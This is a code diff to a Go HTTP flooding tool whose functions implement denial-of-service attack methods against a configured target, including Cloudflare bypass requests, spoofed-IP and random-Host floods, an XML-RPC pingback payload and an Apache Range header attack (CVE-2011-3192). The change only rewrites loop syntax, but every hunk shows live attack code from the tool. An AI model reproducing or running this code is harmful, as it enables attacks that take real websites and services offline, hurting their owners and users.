@@ -407,7 +407,7 @@ func executeCFB(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	// This is a simplified version - full CFB requires JavaScript challenge solving
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -430,7 +430,7 @@ func executeBYPASS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	// Generic bypass method using standard HTTP client
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -457,7 +457,7 @@ func executeOVH(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		maxRPC = 5
 	}
 
-	for i := 0; i < maxRPC; i++ {
+	for range maxRPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -487,7 +487,7 @@ func executeDYN(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	randomPrefix := utils.RandString(6)
 	spoofIP := utils.RandIPv4()
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path)
 		headers += fmt.Sprintf("Host: %s.%s\r\n", randomPrefix, targetURL.Host)
 		if len(cfg.UserAgents) > 0 {
@@ -550,7 +550,7 @@ func executeGSB(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 	targetURL, _ := url.Parse(cfg.Target)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		randomQS := utils.RandString(6)
 		path := targetURL.Path
 		if path == "" {
@@ -600,7 +600,7 @@ func executeDGB(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 		maxRPC = 5
 	}
 
-	for i := 0; i < maxRPC; i++ {
+	for range maxRPC {
 		time.Sleep(time.Duration(maxRPC) * time.Millisecond / 100)
 
 		req, err := http.NewRequest("GET", cfg.Target, nil)
@@ -630,7 +630,7 @@ func executeAVB(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 	headers := buildRawHeaders(cfg.Target, cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		delay := time.Duration(cfg.RPC) * time.Millisecond / 1000
 		if delay < 1*time.Millisecond {
 			delay = 1 * time.Millisecond
@@ -666,7 +666,7 @@ func executeCFBUAM(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 	// Send subsequent requests
 	startTime := time.Now()
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		if time.Since(startTime) > 120*time.Second {
 			break
 		}
@@ -684,7 +684,7 @@ func executeAPACHE(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	// Apache Range header attack (CVE-2011-3192)
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -713,7 +713,7 @@ func executeXMLRPC(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	// XML-RPC pingback attack
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		xmlPayload := fmt.Sprintf(`<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>`,
 			utils.RandString(64),
 			utils.RandString(64))
@@ -786,7 +786,7 @@ func executeBOT(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 
 	// Send regular requests
 	headers := buildRawHeaders(cfg.Target, cfg)
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		n, err := conn.Write([]byte(headers))
 		if err != nil {
 			break
@@ -801,7 +801,7 @@ func executeBOMB(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	// This is a simplified version without external bombardier dependency
 	client := createHTTPClient(cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		req, err := http.NewRequest("GET", cfg.Target, nil)
 		if err != nil {
 			continue
@@ -829,7 +829,7 @@ func executeDOWNLOADER(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter
 
 	headers := buildRawHeaders(cfg.Target, cfg)
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		conn.Write([]byte(headers))
 		requestsSent.Add(1)
 		bytesSent.Add(int64(len(headers)))
@@ -852,7 +852,7 @@ func executeDOWNLOADER(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter
 func executeKILLER(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	// Killer method - spawns multiple GET requests
 	// This is a simplified version - spawning goroutines for each request
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		go executeGET(cfg, requestsSent, bytesSent)
 	}
 }
@@ -889,7 +889,7 @@ func executeTOR(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	defer conn.Close()
 
 	modifiedURL, _ := url.Parse(modifiedTarget)
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", modifiedURL.Path)
 		headers += fmt.Sprintf("Host: %s\r\n", newHost)
 
@@ -930,7 +930,7 @@ func executeRHEX(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	hexSizes := []int{32, 64, 128}
 	randHex := fmt.Sprintf("%x", utils.RandomBytes(hexSizes[rand.Intn(len(hexSizes))]))
 
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		headers := fmt.Sprintf("GET %s/%s HTTP/1.1\r\n", targetURL.Host, randHex)
 		headers += fmt.Sprintf("Host: %s/%s\r\n", targetURL.Host, randHex)
 
@@ -1010,7 +1010,7 @@ func executeSTOMP(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
 	bytesSent.Add(int64(len(p1)))
 
 	// Subsequent requests
-	for i := 0; i < cfg.RPC; i++ {
+	for range cfg.RPC {
 		p2 := fmt.Sprintf("GET %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n", targetURL.Host)
 		p2 += fmt.Sprintf("Host: %s\r\n", hexh)
 
